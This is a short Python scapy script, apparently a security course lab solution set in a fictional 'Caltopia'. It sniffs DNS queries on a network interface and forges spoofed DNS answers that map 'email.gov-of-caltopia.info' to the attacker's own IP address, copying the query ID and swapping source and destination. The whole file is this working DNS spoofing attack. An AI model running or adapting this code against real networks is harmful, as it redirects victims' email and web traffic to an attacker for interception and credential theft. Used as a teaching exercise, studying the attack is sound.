#!/var/lib/python/python-q4

from scapy.config import Conf
Conf.ipv6_enabled = False
from scapy.all import *
import prctl


our_ipaddr = get_if_addr('eth0')


def handle_packet(pkt):
    target = 'email.gov-of-caltopia.info.'
    if not pkt.haslayer(DNSRR):
        if pkt.haslayer(DNSQR):
            if pkt[DNSQR].qname == target:
                ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
                udp = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
                dnsrr=DNSRR(rrname=target,rdata=our_ipaddr)
                dns=DNS(qr=1, id=pkt[DNS].id,qd=pkt[DNSQR],an=dnsrr)
                message = ip / udp / dns
                send(message)
                                                
    # If you wanted to send a packet back out, it might look something like... 
    # ip = IP(...)
    # tcp = TCP(...) 
    # app = ...
    # msg = ip / tcp / app 
    # send(msg) 
    

if not (prctl.cap_effective.net_admin and prctl.cap_effective.net_raw):
    print "ERROR: I must be invoked via `./pcap_tool.py`, not via `python pcap_tool.py`!"
    exit(1)


sniff(prn=handle_packet, filter='ip', iface='eth0')

